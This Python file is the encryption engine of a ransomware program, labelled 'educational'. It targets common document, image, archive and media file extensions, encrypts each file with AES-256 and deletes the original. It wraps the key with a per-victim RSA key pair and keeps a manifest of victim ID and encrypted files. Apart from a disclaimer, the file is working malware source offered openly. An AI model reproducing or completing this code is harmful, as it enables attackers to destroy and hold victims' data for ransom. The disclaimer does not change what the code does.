"""
Educational Ransomware - Cryptography Engine
⚠️ FOR EDUCATIONAL PURPOSES ONLY

This is an educational demonstration of ransomware encryption techniques.
NEVER use this on systems you don't own or without explicit authorization.
"""

import os
import json
from pathlib import Path
from typing import List, Tuple
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
import base64


class CryptoEngine:
    """Handles encryption/decryption operations"""

    # Extensions to encrypt (educational - limited scope)
    TARGET_EXTENSIONS = [
        '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx',
        '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif',
        '.zip', '.rar', '.7z', '.mp3', '.mp4', '.avi'
    ]

    ENCRYPTED_EXTENSION = '.encrypted'

    def __init__(self):
        # Generate RSA key pair (victim-specific)
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.public_key = self.private_key.public_key()

    def generate_file_key(self) -> bytes:
        """Generate random AES-256 key for file encryption"""
        return os.urandom(32)  # 256 bits

    def encrypt_file(self, file_path: Path, aes_key: bytes) -> bool:
        """
        Encrypt a single file using AES-256-CBC
        Returns True on success, False on failure
        """
        try:
            # Read original file
            with open(file_path, 'rb') as f:
                plaintext = f.read()

            # Generate IV
            iv = os.urandom(16)

            # Encrypt with AES-256-CBC
            cipher = Cipher(
                algorithms.AES(aes_key),
                modes.CBC(iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()

            # Pad plaintext to block size
            padded_plaintext = self._pad(plaintext)
            ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()

            # Write encrypted file (IV + ciphertext)
            encrypted_path = file_path.with_suffix(file_path.suffix + self.ENCRYPTED_EXTENSION)
            with open(encrypted_path, 'wb') as f:
                f.write(iv + ciphertext)

            # Remove original file
            os.remove(file_path)

            return True

        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
            return False

    def decrypt_file(self, encrypted_path: Path, aes_key: bytes) -> bool:
        """
        Decrypt a file encrypted with encrypt_file
        Returns True on success, False on failure
        """
        try:
            # Read encrypted file
            with open(encrypted_path, 'rb') as f:
                data = f.read()

            # Extract IV and ciphertext
            iv = data[:16]
            ciphertext = data[16:]

            # Decrypt with AES-256-CBC
            cipher = Cipher(
                algorithms.AES(aes_key),
                modes.CBC(iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()

            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            plaintext = self._unpad(padded_plaintext)

            # Restore original file
            original_path = Path(str(encrypted_path).replace(self.ENCRYPTED_EXTENSION, ''))
            with open(original_path, 'wb') as f:
                f.write(plaintext)

            # Remove encrypted file
            os.remove(encrypted_path)

            return True

        except Exception as e:
            print(f"Error decrypting {encrypted_path}: {e}")
            return False

    def encrypt_key_with_rsa(self, aes_key: bytes) -> bytes:
        """Encrypt AES key with RSA public key"""
        encrypted_key = self.public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return encrypted_key

    def decrypt_key_with_rsa(self, encrypted_key: bytes) -> bytes:
        """Decrypt AES key with RSA private key"""
        aes_key = self.private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return aes_key

    def export_private_key(self) -> bytes:
        """Export private key (for decryptor)"""
        pem = self.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        return pem

    def export_public_key(self) -> bytes:
        """Export public key"""
        pem = self.public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return pem

    @staticmethod
    def import_private_key(pem: bytes):
        """Import private key from PEM"""
        private_key = serialization.load_pem_private_key(
            pem,
            password=None,
            backend=default_backend()
        )
        return private_key

    @staticmethod
    def _pad(data: bytes) -> bytes:
        """PKCS7 padding"""
        padding_length = 16 - (len(data) % 16)
        padding = bytes([padding_length] * padding_length)
        return data + padding

    @staticmethod
    def _unpad(data: bytes) -> bytes:
        """Remove PKCS7 padding"""
        padding_length = data[-1]
        return data[:-padding_length]


class EncryptionManifest:
    """Tracks encrypted files and metadata"""

    def __init__(self, manifest_path: Path = None):
        self.manifest_path = manifest_path or Path.home() / '.ransom_manifest.json'
        self.manifest = {
            'encrypted_files': [],
            'encrypted_aes_key': None,
            'victim_id': None,
            'timestamp': None
        }

    def add_file(self, file_path: str):
        """Add encrypted file to manifest"""
        self.manifest['encrypted_files'].append(file_path)

    def set_encrypted_key(self, encrypted_key: bytes):
        """Store RSA-encrypted AES key"""
        self.manifest['encrypted_aes_key'] = base64.b64encode(encrypted_key).decode()

    def set_victim_id(self, victim_id: str):
        """Set victim ID"""
        self.manifest['victim_id'] = victim_id

    def set_timestamp(self, timestamp: str):
        """Set encryption timestamp"""
        self.manifest['timestamp'] = timestamp

    def save(self):
        """Save manifest to disk"""
        with open(self.manifest_path, 'w') as f:
            json.dump(self.manifest, f, indent=2)

    def load(self) -> bool:
        """Load manifest from disk"""
        try:
            with open(self.manifest_path, 'r') as f:
                self.manifest = json.load(f)
            return True
        except:
            return False

    def get_encrypted_key(self) -> bytes:
        """Get RSA-encrypted AES key"""
        return base64.b64decode(self.manifest['encrypted_aes_key'])

    def get_encrypted_files(self) -> List[str]:
        """Get list of encrypted files"""
        return self.manifest['encrypted_files']
